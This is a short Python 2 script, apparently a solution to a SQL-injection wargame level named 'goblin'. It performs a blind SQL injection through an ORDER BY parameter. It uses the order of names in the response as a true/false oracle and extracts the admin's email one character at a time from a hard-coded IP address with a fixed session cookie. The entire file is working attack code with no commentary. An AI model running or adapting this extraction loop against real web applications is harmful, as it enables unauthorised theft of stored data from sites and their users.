#!/usr/bin/python
import httplib


def makePayload(statement):
  return "/los2/goblin_f04b200c31d03ffadc8071e4f668e47e.php?order=substr(email,1,%d)='%s%%%s'/**/desc" % (len(statement[0])+1,statement[0], hex (statement[1])[2:]) 


def checkResponse(response):
   
  #return (response.find("Hello admin") != -1)
  return (response.find("admin") < response.find("krystal"))


def doAssert(conn, statement):
  pay = makePayload(statement)
  conn.request("GET", pay, "", header)
  response = conn.getresponse()
  content = response.read()

  return checkResponse(content)

if __name__ == "__main__":
  url = "119.81.231.181"
  header = {"cookie":"PHPSESSID=58pscrtm57cc9mkqq5al00uc82"}
  conn = httplib.HTTPConnection(url)
  result =""
  for idx in range(1,25):
    print "idx %d" % idx
    for code in range(48,127):  # 46 == '.' in ascii
                                # but '.' is banned then we need guessing
      if doAssert(conn, (result, code)):
        result += (chr(code))
        print result.lower()
        break
  print ''.join(result).lower()
